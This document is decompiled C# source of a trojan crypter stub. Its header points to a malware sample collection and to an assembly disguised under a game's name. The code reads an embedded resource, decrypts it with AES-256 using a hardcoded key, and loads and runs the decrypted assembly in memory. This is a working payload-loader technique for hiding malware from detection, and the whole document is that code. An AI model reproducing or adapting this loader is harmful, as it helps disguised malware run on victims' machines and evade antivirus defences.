// Decompiled with JetBrains decompiler
// Type: Stub.cMain
// Assembly: Days Gone, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 65527950-60CA-49D0-99B8-029FD33212B1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-3dc512c40b9afc7fa8f834f52d79261d585dcaf041dd7f34278bd19b9e2b5fcb.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace Stub
{
  internal static class cMain
  {
    private static byte[] bSalt = new byte[8];

    public static byte[] Decrypt(byte[] bData, byte[] bKey)
    {
      byte[] numArray = (byte[]) null;
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bKey, cMain.bSalt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bData, 0, bData.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    [STAThread]
    private static void Main()
    {
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("04GESFUU"))
      {
        if (manifestResourceStream == null)
          return;
        byte[] numArray = new byte[manifestResourceStream.Length];
        manifestResourceStream.Read(numArray, 0, numArray.Length);
        Assembly.Load(cMain.Decrypt(numArray, Encoding.Default.GetBytes("04GESFUU5SMQAFX23LFCFHX578XLVK0OXV8NA8H5"))).EntryPoint.Invoke((object) null, (object[]) null);
      }
    }
  }
}
